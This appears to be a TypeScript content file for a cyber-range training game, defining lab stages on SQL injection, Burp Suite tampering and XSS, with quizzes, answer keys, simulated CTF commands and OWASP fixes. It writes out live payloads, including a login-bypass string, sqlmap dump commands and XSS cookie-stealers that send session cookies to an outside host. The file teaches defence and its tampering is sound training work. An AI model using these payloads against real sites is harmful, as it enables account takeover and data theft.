import type { EpochConfig, StageConfig } from "./types";

// ── Cyber Range: Web Exploitation ────────────────────────────────────────────
// The web attacker's toolkit: SQL injection (sqlmap), an intercepting proxy
// (Burp Suite), cross-site scripting, and file inclusion / command injection.
// Simulated faithful tooling against a deliberately vulnerable lab app; every
// attack pairs with its OWASP fix. All from public sources (OWASP, PortSwigger).

export const rangeWebEpoch: EpochConfig = {
  id: "range-web",
  name: "Web Exploitation",
  subtitle: "SQL injection, Burp, XSS, and file inclusion — the OWASP web attacks",
  description:
    "The web is the biggest attack surface there is. Learn the core web exploits hands-on: SQL injection with sqlmap, intercepting and tampering requests with Burp Suite, cross-site scripting to steal sessions, and local file inclusion escalating to remote code execution — each paired with the OWASP defense.",
  emoji: "🕸️",
  color: "Orange",
  unlocked: true,
};

const kali = { ip: "10.10.14.5", hostname: "kali", os: "Kali Linux 2024.1" } as const;
const web = (vuln: string) => ({ ip: "10.10.10.40", hostname: "lab-webapp", os: "Linux / Apache + PHP + MySQL", openPorts: "80, 443 (HTTP/S)", vulnerability: vuln });

export const rangeWebStages: StageConfig[] = [
  // ─── Lab 1: SQL injection + sqlmap ──────────────────────────────────────────
  {
    epochId: "range-web",
    wonder: { name: "The Query Vault", location: "Offensive Security Lab", era: "Present Day", emoji: "🗄️" },
    id: "web-01",
    order: 1,
    title: "SQL Injection: Dumping the Database",
    subtitle: "From a broken login to the whole database with sqlmap",
    category: "owasp",
    owaspRef: "A03:2021 — Injection",
    xp: 175,
    badge: { id: "badge-web-sqli", name: "Injector", emoji: "💉" },
    challengeType: "ctf",
    info: {
      tagline: "When user input is concatenated into a SQL query, the attacker stops being a user and starts being the database.",
      year: 1998,
      overview: [
        "SQL injection is the oldest and still one of the most damaging web vulnerabilities: it happens whenever untrusted input is concatenated directly into a SQL query instead of being safely parameterized. The classic demonstration is a login form whose query is `SELECT * FROM users WHERE user='$u' AND pass='$p'` — feed the username `admin'--` and the rest of the query is commented out, logging you in as admin with no password. From there, injection escalates from authentication bypass to reading, modifying, and exfiltrating the entire database.",
        "The high-impact technique is the UNION-based attack: by appending `UNION SELECT` to a vulnerable parameter, the attacker makes the application return data from any table — usernames, password hashes, anything — in the page's own output. Doing this by hand is tedious, so sqlmap automates the whole process: it detects the injection point, fingerprints the database, enumerates tables and columns, and dumps the data, all from one command. It even cracks recovered password hashes and can pop a shell where the database permits. OWASP ranks injection in its Top 10 for a reason — and the fix, parameterized queries, has been known for decades.",
      ],
      technical: {
        title: "SQL Injection Mechanics + sqlmap",
        body: [
          "How the injection works:\n- Authentication bypass: username `admin'-- ` turns the WHERE clause into `user='admin'--' AND pass=...`, commenting out the password check.\n- UNION-based extraction: `?id=1 UNION SELECT username,password FROM users--` returns table data in the response.\n- Error-based / blind / time-based: when output isn't reflected, infer data from errors, true/false page differences, or `SLEEP()` delays.",
          "sqlmap automates all of it:\n- sqlmap -u 'http://site/product?id=1' — detect + confirm the injection.\n- --dbs / --tables -D <db> / --dump -T users — enumerate and dump.\n- --batch — non-interactive; --risk/--level — how hard to probe.\n- --os-shell — attempt OS command execution where the DB allows it.",
          "The fix (OWASP) is decades old and complete:\n- Parameterized queries / prepared statements — input is data, never code (the real fix).\n- An ORM used correctly, plus least-privilege DB accounts and input validation as defense in depth.\n- A WAF helps but is not a substitute — parameterization is.",
        ],
        codeExample: {
          label: "Login bypass → full dump",
          code: `# Authentication bypass (no password)
username:  admin'--
password:  anything
# query becomes: SELECT * FROM users WHERE user='admin'--' AND pass='anything'

# Automate extraction with sqlmap
$ sqlmap -u "http://10.10.10.40/product?id=1" --batch --dbs
[*] available databases: information_schema, appdb
$ sqlmap -u "http://10.10.10.40/product?id=1" -D appdb --dump -T users
| id | username | password (md5)                       |
| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99     |  # cracked: "password"

# THE FIX — parameterized query (Python example)
cur.execute("SELECT * FROM users WHERE id = %s", (user_id,))`,
        },
      },
      incident: {
        title: "Injection — Decades of Breaches from One Bug Class",
        when: "1998 (first documented) → present (still OWASP Top 10)",
        where: "Web applications everywhere — from small sites to TalkTalk, Heartland, and countless others",
        impact: "Mass credential and PII theft; SQLi remains a leading root cause of data breaches",
        body: [
          "SQL injection has driven some of the largest breaches on record — the 2015 TalkTalk breach (millions of records), the Heartland payment compromise, and a long tail of credential dumps that fuel credential-stuffing everywhere. It persists because it's trivially introduced by string concatenation and trivially exploited by tools like sqlmap, yet the fix has been understood since the late 1990s.",
          "That is the uncomfortable lesson: parameterized queries completely eliminate the class, and they've been standard library functionality for twenty years, yet injection stays in the OWASP Top 10 because developers keep concatenating. Defense in depth — least-privilege DB accounts, input validation, a WAF — reduces blast radius, but only parameterization removes the vulnerability.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "admin'-- / UNION SELECT", type: "attacker" },
          { label: "Web app", sub: "string-concatenated SQL", type: "system" },
          { label: "Database", sub: "users, hashes dumped", type: "victim" },
          { label: "Full compromise", sub: "→ fix: parameterize", type: "result" },
        ],
      },
      timeline: [
        { year: 1998, event: "SQL injection first publicly documented (Phrack)" },
        { year: 2009, event: "Heartland breach — SQLi to 130M+ cards" },
        { year: 2015, event: "TalkTalk SQLi breach — millions of customer records", highlight: true },
      ],
      keyTakeaways: [
        "SQLi occurs when input is concatenated into a query instead of parameterized",
        "admin'-- bypasses login; UNION SELECT extracts any table into the response",
        "sqlmap automates detection, enumeration, dumping, hash cracking, and even OS shells",
        "The complete fix is parameterized queries / prepared statements — input as data, never code",
        "Defense in depth (least-privilege DB, validation, WAF) reduces blast radius but doesn't replace parameterization",
      ],
      references: [
        { title: "OWASP — SQL Injection", url: "https://owasp.org/www-community/attacks/SQL_Injection" },
        { title: "sqlmap — Usage", url: "https://github.com/sqlmapproject/sqlmap/wiki/Usage" },
      ],
    },
    quiz: {
      questions: [
        { id: "web-01-q1", type: "Root Cause", challenge: "Why it happens.", text: "What causes SQL injection?", options: ["Untrusted input concatenated into a SQL query instead of parameterized", "Strong passwords", "HTTPS", "A firewall"], correctIndex: 0, explanation: "Mixing data into query code is the root cause." },
        { id: "web-01-q2", type: "Bypass", challenge: "Login bypass.", text: "What does the username admin'-- do on a vulnerable login?", options: ["Comments out the password check, logging in as admin", "Crashes the database", "Encrypts the form", "Nothing"], correctIndex: 0, explanation: "-- comments out the rest of the WHERE clause, skipping the password." },
        { id: "web-01-q3", type: "Extraction", challenge: "Read any table.", text: "What does a UNION SELECT injection achieve?", options: ["Returns data from arbitrary tables in the page's output", "Deletes the schema", "Resets passwords", "Pings the host"], correctIndex: 0, explanation: "UNION appends attacker-chosen rows to the result set." },
        { id: "web-01-q4", type: "Tool", challenge: "Automation.", text: "What does sqlmap do?", options: ["Automates SQLi detection, enumeration, and data dumping", "Scans ports", "Cracks WiFi", "Sniffs packets"], correctIndex: 0, explanation: "sqlmap automates the whole SQLi workflow." },
        { id: "web-01-q5", type: "Blind", challenge: "No output.", text: "When the app reflects no data, how does blind SQLi extract it?", options: ["Inferring data from true/false page differences or time delays (SLEEP)", "It can't", "By emailing the admin", "Via DNS only"], correctIndex: 0, explanation: "Boolean/time-based blind techniques infer data bit by bit." },
        { id: "web-01-q6", type: "Fix", challenge: "The real fix.", text: "What completely eliminates SQL injection?", options: ["Parameterized queries / prepared statements", "A longer password", "Renaming tables", "Disabling cookies"], correctIndex: 0, explanation: "Parameterization treats input as data, never executable SQL." },
        { id: "web-01-q7", type: "Defense in Depth", challenge: "Limit blast radius.", text: "Which reduces SQLi damage but doesn't fix it?", options: ["Least-privilege DB accounts + WAF + input validation", "Parameterized queries", "Nothing helps", "Bigger servers"], correctIndex: 0, explanation: "These are defense in depth; only parameterization removes the bug." },
        { id: "web-01-q8", type: "OWASP", challenge: "Category.", text: "Where does injection sit in the OWASP Top 10?", options: ["A03:2021 — Injection (a perennial top risk)", "It's not listed", "A10 only", "It was removed"], correctIndex: 0, explanation: "Injection is OWASP A03:2021 and has been top-tier for years." },
      ],
    },
    ctf: {
      attackerMachine: kali,
      targetMachine: web("SQL injection (A03) in /product?id and /login"),
      scenario: "The lab web app at http://10.10.10.40 has a product page that builds SQL from the id parameter. Prove the injection, then use sqlmap to dump the users table — including the admin hash.",
      hint: "Test the login bypass and the id parameter, then point sqlmap at the vulnerable URL and dump the database.",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "Test for injection (login bypass + id param). Run: sqli-test http://10.10.10.40/login",
        "Automate the dump with sqlmap. Run: sqlmap http://10.10.10.40/product?id=1",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{SQL1_", label: "SQLi Briefing" },
        { trigger: "sqli-test http://10.10.10.40/login", value: "UN10N_", label: "Injection Confirmed" },
        { trigger: "sqlmap http://10.10.10.40/product?id=1", value: "DUMP3D_DB}", label: "Database Dumped" },
      ],
      files: {
        "/briefing.txt": [
          "RANGE — WEB LAB 1: SQL INJECTION",
          "Target http://10.10.10.40  (product?id, login form)",
          "Goal: confirm SQLi, dump the users table with sqlmap.",
          "Sequence: sqli-test http://10.10.10.40/login -> sqlmap http://10.10.10.40/product?id=1 -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "sqli-test": (args: string[]) => {
          if (!String(args[0] || "").includes("10.10.10.40")) return { lines: ["Usage: sqli-test http://10.10.10.40/login"] };
          return {
            lines: [
              "Testing login with: username=admin'--  password=x",
              "  query => SELECT * FROM users WHERE user='admin'--' AND pass='x'",
              "  [+] Logged in as admin (password check commented out)",
              "Testing id param: /product?id=1' →  SQL error (injectable)",
              "  /product?id=1 UNION SELECT 1,2,3-- →  reflects columns 2,3",
              "",
              ">> LEARN: admin'-- bypasses auth; UNION SELECT reads any table",
              "   The single quote broke out of the string → you control the query.",
              "   Fragment collected.",
            ],
          };
        },
        "sqlmap": (args: string[]) => {
          if (!String(args[0] || "").includes("10.10.10.40")) return { lines: ["Usage: sqlmap http://10.10.10.40/product?id=1"] };
          return {
            lines: [
              "$ sqlmap -u 'http://10.10.10.40/product?id=1' --batch --dump -T users",
              "[*] the back-end DBMS is MySQL",
              "[*] dumping table 'users' in database 'appdb'",
              "+----+----------+----------------------------------+",
              "| id | username | password (md5)                   |",
              "| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |  (cracked: password)",
              "| 2  | jsmith   | e10adc3949ba59abbe56e057f20f883e |  (cracked: 123456)",
              "+----+----------+----------------------------------+",
              "",
              ">> LEARN: sqlmap detected, enumerated, dumped, and cracked — one command",
              ">> BLUE TEAM: parameterized queries kill this entirely; least-priv DB user limits it.",
              "   Run 'assemble' to view the flag and the submit command.",
            ],
          };
        },
      },
    },
  },

  // ─── Lab 2: Burp Suite — intercept & tamper ─────────────────────────────────
  {
    epochId: "range-web",
    wonder: { name: "The Proxy in the Middle", location: "Offensive Security Lab", era: "Present Day", emoji: "🧰" },
    id: "web-02",
    order: 2,
    title: "Burp Suite: Intercept & Tamper",
    subtitle: "Sit between browser and server, and change anything",
    category: "owasp",
    owaspRef: "A01:2021 — Broken Access Control",
    xp: 175,
    badge: { id: "badge-web-burp", name: "Interceptor", emoji: "🧰" },
    challengeType: "ctf",
    info: {
      tagline: "Client-side checks are suggestions — Burp Suite lets you rewrite every request after the browser sends it.",
      year: 2003,
      overview: [
        "Burp Suite is the web hacker's primary workbench: an intercepting proxy that sits between your browser and the target, capturing every request so you can read it, modify it, and replay it. The single most important lesson it teaches is that nothing the client enforces is trustworthy — hidden form fields, disabled buttons, price values, JavaScript validation, and role parameters are all just data the browser sends, and Burp lets the attacker change them after the client's checks have run. A price of `9.99` becomes `0.01`; a `role=user` becomes `role=admin`; a `userId=1001` becomes `userId=1`.",
        "Its core tools form the workflow: Proxy intercepts live traffic; Repeater lets you hand-edit and resend a single request over and over to probe behavior; Intruder automates payload injection (fuzzing parameters, brute-forcing); and the scanner finds issues automatically. The classic finding it surfaces is broken access control — and specifically IDOR (Insecure Direct Object Reference), where changing an identifier in a request returns another user's data because the server never checks whether you're allowed to see it. The fix is always the same principle: enforce authorization on the server for every object and action, because the client can be made to send anything.",
      ],
      technical: {
        title: "Intercepting Proxy Workflow",
        body: [
          "Burp's core tools:\n- Proxy — intercept, view, and modify requests/responses in flight.\n- Repeater — manually tweak and resend one request to study the server's behavior.\n- Intruder — automate payloads across positions (fuzzing, brute force, enumeration).\n- Scanner / Decoder / Comparer — automated finds, encoding, and diffing.",
          "What tampering exposes (all server-trust failures):\n- IDOR — change userId/orderId/accountId to access another user's object (broken access control).\n- Hidden-field / parameter tampering — edit price, quantity, role, isAdmin that the client 'set'.\n- Forced browsing / privilege escalation — request admin endpoints directly.\n- Mass assignment — add fields (role=admin) the form didn't show.",
          "The fix (OWASP Broken Access Control):\n- Enforce authorization on the SERVER for every object and action — never trust client-supplied identifiers or flags.\n- Deny by default; check ownership on each request; don't expose internal IDs as the only control.\n- Re-validate price/role/quantity server-side; never rely on hidden fields or client JS.",
        ],
        codeExample: {
          label: "IDOR + parameter tampering via Burp Repeater",
          code: `# Original request (your own order)
GET /api/orders/1001 HTTP/1.1
Cookie: session=...

# In Burp Repeater, change the ID — no authz check on the server:
GET /api/orders/1   HTTP/1.1     ->  200 OK: returns the ADMIN's order (IDOR)

# Parameter tampering on checkout (price set client-side):
POST /checkout      price=9.99   ->  edit to price=0.01  ->  order placed at 1 cent

# THE FIX — server-side ownership check
if order.user_id != session.user_id: return 403   # deny by default`,
        },
      },
      incident: {
        title: "Broken Access Control — OWASP's #1 Risk",
        when: "2021 — broken access control becomes OWASP Top 10 #1",
        where: "APIs and web apps that trust client-supplied identifiers/roles",
        impact: "IDOR and parameter tampering routinely expose other users' data and admin functions",
        body: [
          "In the 2021 OWASP Top 10, Broken Access Control rose to #1 — the most common serious web risk — precisely because of the failures Burp makes obvious: applications that check access in the UI but not on the server. Real-world IDOR has exposed banking records, medical data, and entire user tables simply by incrementing an ID in a request.",
          "The defense never changes: authorization is a server-side decision made on every request, for every object and action, denying by default. Hidden fields, disabled buttons, and client-side validation improve UX but enforce nothing — Burp exists to prove it. If your security depends on the browser behaving, you have no security.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker + Burp", sub: "intercept / repeater", type: "attacker" },
          { label: "Modified request", sub: "id=1, price=0.01, role=admin", type: "system" },
          { label: "Server (no authz)", sub: "trusts client values", type: "victim" },
          { label: "Other users' data / admin", sub: "→ fix: server-side authz", type: "result" },
        ],
      },
      timeline: [
        { year: 2003, event: "PortSwigger releases Burp Suite" },
        { year: 2017, event: "Broken Access Control prominent in OWASP Top 10" },
        { year: 2021, event: "Broken Access Control becomes OWASP Top 10 #1", highlight: true },
      ],
      keyTakeaways: [
        "Burp is an intercepting proxy: read, modify, and replay every request after the browser sends it",
        "Nothing the client enforces is trustworthy — prices, roles, IDs, and hidden fields are all editable",
        "IDOR: changing an identifier returns another user's object when the server skips the authz check",
        "Core tools: Proxy (intercept), Repeater (manual), Intruder (automate/fuzz)",
        "Fix (Broken Access Control, OWASP #1): enforce authorization server-side, deny by default, check ownership",
      ],
      references: [
        { title: "PortSwigger — Burp Suite Documentation", url: "https://portswigger.net/burp/documentation" },
        { title: "OWASP — Broken Access Control (A01:2021)", url: "https://owasp.org/Top10/A01_2021-Broken_Access_Control/" },
      ],
    },
    quiz: {
      questions: [
        { id: "web-02-q1", type: "Tool", challenge: "What it is.", text: "What is Burp Suite at its core?", options: ["An intercepting proxy that captures and lets you modify web requests", "A port scanner", "A password cracker", "A SIEM"], correctIndex: 0, explanation: "Burp sits between browser and server to intercept/modify traffic." },
        { id: "web-02-q2", type: "Principle", challenge: "Trust.", text: "What is the core lesson Burp teaches?", options: ["Nothing the client enforces (prices, roles, hidden fields) is trustworthy", "JavaScript validation is enough", "HTTPS prevents tampering", "Cookies are uneditable"], correctIndex: 0, explanation: "The client can be made to send anything; only the server can enforce." },
        { id: "web-02-q3", type: "IDOR", challenge: "Change an ID.", text: "What is IDOR?", options: ["Accessing another user's object by changing an identifier the server doesn't authorize", "A DoS attack", "A phishing kit", "An encryption flaw"], correctIndex: 0, explanation: "Insecure Direct Object Reference — missing per-object authorization." },
        { id: "web-02-q4", type: "Workflow", challenge: "Resend one request.", text: "Which Burp tool hand-edits and replays a single request?", options: ["Repeater", "Intruder", "Decoder", "Proxy only"], correctIndex: 0, explanation: "Repeater is for manual, iterative request editing." },
        { id: "web-02-q5", type: "Automation", challenge: "Fuzz/brute.", text: "Which Burp tool automates payloads across parameters?", options: ["Intruder", "Repeater", "Comparer", "Target"], correctIndex: 0, explanation: "Intruder injects payload sets into request positions." },
        { id: "web-02-q6", type: "Tampering", challenge: "Price.", text: "If a checkout sets price client-side, what can an attacker do in Burp?", options: ["Change price=9.99 to price=0.01 before it reaches the server", "Nothing", "Only view it", "Encrypt it"], correctIndex: 0, explanation: "Client-set values are editable in transit; the server must re-validate." },
        { id: "web-02-q7", type: "Fix", challenge: "The defense.", text: "What is the fix for IDOR and parameter tampering?", options: ["Enforce authorization server-side for every object/action; deny by default", "Hide the buttons", "Obfuscate the JavaScript", "Use longer IDs"], correctIndex: 0, explanation: "Server-side authorization on every request is the only real control." },
        { id: "web-02-q8", type: "OWASP", challenge: "Rank.", text: "Where does Broken Access Control rank in OWASP Top 10 2021?", options: ["#1 (A01:2021)", "Not listed", "#10", "It was merged away"], correctIndex: 0, explanation: "Broken Access Control is the #1 risk in the 2021 Top 10." },
      ],
    },
    ctf: {
      attackerMachine: kali,
      targetMachine: web("Broken access control / IDOR (A01) — trusts client-supplied id"),
      scenario: "You're logged into the lab app as a normal user (your order id is 1001). The server trusts the id you send. Intercept the request in Burp and tamper it to read the admin's order — and bypass the price check.",
      hint: "Intercept your request, then change the id (and price) the client sends; the server doesn't re-check.",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "Intercept the live request. Run: burp-intercept",
        "Tamper the id/role to access the admin object. Run: burp-tamper",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{BURP_", label: "Burp Briefing" },
        { trigger: "burp-intercept", value: "T4MP3R_", label: "Request Intercepted" },
        { trigger: "burp-tamper", value: "4UTH_BYP4SS}", label: "Access Control Bypassed" },
      ],
      files: {
        "/briefing.txt": [
          "RANGE — WEB LAB 2: BURP INTERCEPT & TAMPER",
          "You are user jsmith (order id 1001). Admin order id = 1.",
          "Goal: tamper the request to read the admin order (IDOR).",
          "Sequence: burp-intercept -> burp-tamper -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "burp-intercept": (_args: string[]) => ({
          lines: [
            "[Burp Proxy] Intercept is ON",
            "Captured outbound request:",
            "  GET /api/orders/1001 HTTP/1.1",
            "  Cookie: session=eyJ1c2VyIjoianNtaXRoIn0",
            "  X-Role: user",
            "",
            ">> LEARN: the browser already sent it — now YOU control it",
            "   id, role, price: all just client-supplied values you can rewrite.",
            "   Fragment collected.",
          ],
        }),
        "burp-tamper": (_args: string[]) => ({
          lines: [
            "[Burp Repeater] editing the captured request:",
            "  GET /api/orders/1   HTTP/1.1     (1001 -> 1)",
            "  X-Role: admin                    (user -> admin)",
            "  --> 200 OK",
            "  { \"order\": 1, \"owner\": \"admin\", \"items\": [\"...secret...\"] }",
            "",
            ">> LEARN: IDOR — the server returned the admin's order; it never checked ownership",
            ">> BLUE TEAM: enforce authz server-side per object; deny by default; ignore X-Role from the client.",
            "   Run 'assemble' to view the flag and the submit command.",
          ],
        }),
      },
    },
  },

  // ─── Lab 3: XSS — stealing sessions ─────────────────────────────────────────
  {
    epochId: "range-web",
    wonder: { name: "The Injected Script", location: "Offensive Security Lab", era: "Present Day", emoji: "📜" },
    id: "web-03",
    order: 3,
    title: "XSS: Stealing the Session",
    subtitle: "Run your JavaScript in the victim's browser",
    category: "owasp",
    owaspRef: "A03:2021 — Injection (XSS)",
    xp: 175,
    badge: { id: "badge-web-xss", name: "Script Injector", emoji: "📜" },
    challengeType: "ctf",
    info: {
      tagline: "If a site reflects your input into a page without encoding it, you can make every visitor's browser run your code.",
      year: 2000,
      overview: [
        "Cross-site scripting (XSS) is injection aimed at the browser: when an application places untrusted input into a page without proper output encoding, the attacker's input is interpreted as HTML/JavaScript and runs in the victim's browser with the victim's session. Reflected XSS bounces a payload off a parameter (a malicious link); stored XSS persists the payload in the database (a comment, a profile field) so it fires for every visitor; DOM-based XSS happens entirely client-side when JavaScript writes untrusted data into the page. The proof-of-concept is `<script>alert(1)</script>`, but the real payload steals session cookies, performs actions as the user, or rewrites the page to phish credentials.",
        "Session theft is the canonical impact: a stored payload like `<script>fetch('//attacker/c?'+document.cookie)</script>` exfiltrates the victim's session cookie to the attacker, who then rides the session without ever knowing the password. The defenses are layered and well-understood: contextual output encoding (the real fix — encode data for the HTML, attribute, or JS context it lands in), a strong Content-Security-Policy to block inline/injected scripts, and the HttpOnly cookie flag so JavaScript can't read the session cookie even if XSS fires. OWASP folds XSS under Injection because, like SQLi, the root cause is mixing untrusted data with code.",
      ],
      technical: {
        title: "XSS Types, Impact, and Defenses",
        body: [
          "The three types:\n- Reflected — payload in a request parameter is echoed into the response (delivered via a crafted link).\n- Stored — payload saved server-side (comment/profile) and served to every viewer (worst impact).\n- DOM-based — client-side JS writes untrusted data into the DOM (e.g. innerHTML = location.hash).",
          "What the payload actually does:\n- Session theft: <script>new Image().src='//attacker/'+document.cookie</script>.\n- Act as the user: trigger authenticated requests (change email, transfer funds).\n- Phish: rewrite the page with a fake login overlay.\n- Keylog / pivot to internal apps the victim can reach.",
          "The defenses (layered):\n- Contextual output encoding — encode for HTML/attribute/JS context (the real fix).\n- Content-Security-Policy (CSP) — block inline and injected scripts.\n- HttpOnly cookies — JS can't read the session cookie, defeating cookie theft.\n- Input validation + a template engine that auto-escapes by default.",
        ],
        codeExample: {
          label: "Reflected probe → stored session theft",
          code: `# Reflected probe (does input run as script?)
http://10.10.10.40/search?q=<script>alert(document.domain)</script>
# -> alert fires => the parameter is not output-encoded => XSS

# Stored payload in a comment field — fires for EVERY viewer:
<script>fetch('//10.10.14.5/c?'+document.cookie)</script>
# attacker receives: session=eyJ1c2VyIjoiYWRtaW4ifQ  (admin's cookie)

# THE FIX
# 1) output-encode: &lt;script&gt; instead of <script>
# 2) CSP: default-src 'self'; script-src 'self'
# 3) Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax`,
        },
      },
      incident: {
        title: "Samy — the XSS Worm that Took Down MySpace (2005)",
        when: "October 2005",
        where: "MySpace — the largest social network of its era",
        impact: "Over a million profiles infected in under 24 hours by a self-propagating stored-XSS worm",
        body: [
          "In 2005, Samy Kamkar planted a stored-XSS payload on his MySpace profile that added him as a friend and copied itself to anyone who viewed it. It spread to over a million profiles in under a day — the fastest-spreading malware of its time — and it was 'just' an unencoded input field. Samy faced felony charges; the worm is the textbook demonstration that stored XSS executes in every viewer's session.",
          "The defenses that would have stopped it are now standard: output encoding so the payload renders as inert text, CSP to block injected scripts, and HttpOnly cookies so a script can't steal the session. Yet XSS endures because frameworks that don't auto-escape, plus `innerHTML` and `dangerouslySetInnerHTML` used carelessly, keep reintroducing it. Encode on output, set a CSP, and make session cookies HttpOnly.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "<script> payload", type: "attacker" },
          { label: "App (no encoding)", sub: "reflects/stores input", type: "system" },
          { label: "Victim's browser", sub: "runs attacker JS w/ session", type: "victim" },
          { label: "Cookie stolen", sub: "→ fix: encode + CSP + HttpOnly", type: "result" },
        ],
      },
      timeline: [
        { year: 2000, event: "Cross-site scripting named and cataloged" },
        { year: 2005, event: "Samy worm infects 1M+ MySpace profiles via stored XSS", highlight: true },
        { year: 2016, event: "CSP + HttpOnly become standard XSS mitigations" },
      ],
      keyTakeaways: [
        "XSS runs attacker JavaScript in the victim's browser with the victim's session",
        "Reflected (link), Stored (every viewer — worst), DOM-based (client-side) are the three types",
        "Real payloads steal session cookies, act as the user, or phish — not just alert(1)",
        "Real fix is contextual output encoding; add CSP to block injected scripts",
        "HttpOnly cookies stop JavaScript from reading the session cookie even if XSS fires",
      ],
      references: [
        { title: "OWASP — Cross Site Scripting (XSS)", url: "https://owasp.org/www-community/attacks/xss/" },
        { title: "OWASP — XSS Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" },
      ],
    },
    quiz: {
      questions: [
        { id: "web-03-q1", type: "Concept", challenge: "What runs.", text: "What does a successful XSS attack do?", options: ["Runs attacker JavaScript in the victim's browser with their session", "Crashes the server", "Reads the database directly", "Scans ports"], correctIndex: 0, explanation: "XSS executes script in the victim's browser context." },
        { id: "web-03-q2", type: "Types", challenge: "Worst impact.", text: "Which XSS type fires for every visitor?", options: ["Stored XSS (persisted server-side)", "Reflected XSS", "DOM XSS only", "None"], correctIndex: 0, explanation: "Stored XSS is served to all viewers, maximizing impact." },
        { id: "web-03-q3", type: "Root Cause", challenge: "Why.", text: "What causes XSS?", options: ["Untrusted input placed into a page without output encoding", "Weak passwords", "Open ports", "No HTTPS"], correctIndex: 0, explanation: "Missing contextual output encoding lets input run as code." },
        { id: "web-03-q4", type: "Impact", challenge: "Real payload.", text: "What does <script>fetch('//attacker/'+document.cookie)</script> do?", options: ["Exfiltrates the victim's session cookie to the attacker", "Patches the server", "Logs the user out safely", "Encrypts the page"], correctIndex: 0, explanation: "It steals the session cookie, enabling session hijacking." },
        { id: "web-03-q5", type: "Defense", challenge: "Real fix.", text: "What is the primary fix for XSS?", options: ["Contextual output encoding of untrusted data", "Longer cookies", "Disabling JavaScript globally", "A CAPTCHA"], correctIndex: 0, explanation: "Encoding on output renders payloads as inert text." },
        { id: "web-03-q6", type: "Defense", challenge: "Cookie flag.", text: "What does the HttpOnly cookie flag do?", options: ["Prevents JavaScript from reading the cookie, defeating XSS cookie theft", "Encrypts the cookie", "Makes the cookie permanent", "Blocks all cookies"], correctIndex: 0, explanation: "HttpOnly hides the cookie from document.cookie." },
        { id: "web-03-q7", type: "Defense", challenge: "Block scripts.", text: "What does a Content-Security-Policy (CSP) do for XSS?", options: ["Restricts which scripts can run, blocking injected/inline scripts", "Speeds up the page", "Encrypts traffic", "Replaces the WAF"], correctIndex: 0, explanation: "A strong CSP blocks unauthorized inline/injected scripts." },
        { id: "web-03-q8", type: "Real World", challenge: "The worm.", text: "What was the 2005 Samy worm?", options: ["A self-propagating stored-XSS worm that hit 1M+ MySpace profiles", "A ransomware strain", "An SSH brute-forcer", "A DNS attack"], correctIndex: 0, explanation: "Samy spread via stored XSS in a profile field." },
      ],
    },
    ctf: {
      attackerMachine: kali,
      targetMachine: web("Cross-site scripting (XSS) in /search and the comments field"),
      scenario: "The lab app reflects the search term into the results page unencoded, and the comment field is stored unencoded. Confirm the reflected XSS, then plant a stored payload that steals the admin's session cookie.",
      hint: "Probe the search parameter for script execution, then store a cookie-stealing payload that fires when the admin views it.",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "Probe for reflected XSS. Run: xss-probe http://10.10.10.40/search",
        "Plant a stored cookie-stealer and catch the admin's cookie. Run: xss-steal",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{XSS_", label: "XSS Briefing" },
        { trigger: "xss-probe http://10.10.10.40/search", value: "C00K13_", label: "Reflected XSS Confirmed" },
        { trigger: "xss-steal", value: "3XF1LTR4T3D}", label: "Session Cookie Stolen" },
      ],
      files: {
        "/briefing.txt": [
          "RANGE — WEB LAB 3: XSS SESSION THEFT",
          "Target http://10.10.10.40 (reflected /search, stored comments)",
          "Goal: confirm XSS, steal the admin session cookie.",
          "Sequence: xss-probe http://10.10.10.40/search -> xss-steal -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "xss-probe": (args: string[]) => {
          if (!String(args[0] || "").includes("10.10.10.40")) return { lines: ["Usage: xss-probe http://10.10.10.40/search"] };
          return {
            lines: [
              "GET /search?q=<script>alert(document.domain)</script>",
              "Response reflects the term VERBATIM into the page:",
              "  <h2>Results for <script>alert(document.domain)</script></h2>",
              "  [+] alert fired => input is NOT output-encoded => XSS confirmed",
              "",
              ">> LEARN: the app echoed your <script> as code, not text",
              "   Reflected XSS is delivered via a crafted link to the victim.",
              "   Fragment collected.",
            ],
          };
        },
        "xss-steal": (_args: string[]) => ({
          lines: [
            "Planting STORED payload in the comments field:",
            "  <script>new Image().src='//10.10.14.5/c?'+document.cookie</script>",
            "[*] listener on 10.10.14.5 ... waiting for the admin to view the page ...",
            "[+] GET /c?session=eyJ1c2VyIjoiYWRtaW4ifQ   <-- ADMIN cookie received",
            "[*] set the cookie in your browser -> logged in as admin (no password)",
            "",
            ">> LEARN: stored XSS fires in every viewer's session — here, the admin's",
            ">> BLUE TEAM: output-encode, CSP (script-src 'self'), HttpOnly cookies.",
            "   Run 'assemble' to view the flag and the submit command.",
          ],
        }),
      },
    },
  },

  // ─── Lab 4: LFI → RCE + command injection ───────────────────────────────────
  {
    epochId: "range-web",
    wonder: { name: "The Included File", location: "Offensive Security Lab", era: "Present Day", emoji: "📂" },
    id: "web-04",
    order: 4,
    title: "LFI to RCE & Command Injection",
    subtitle: "Read files, then run commands on the server",
    category: "owasp",
    owaspRef: "A03:2021 — Injection",
    xp: 200,
    badge: { id: "badge-web-lfi", name: "Code Executor", emoji: "📂" },
    challengeType: "ctf",
    info: {
      tagline: "When a web app includes or executes a path you control, reading /etc/passwd is the warm-up — running commands is the goal.",
      year: 2002,
      overview: [
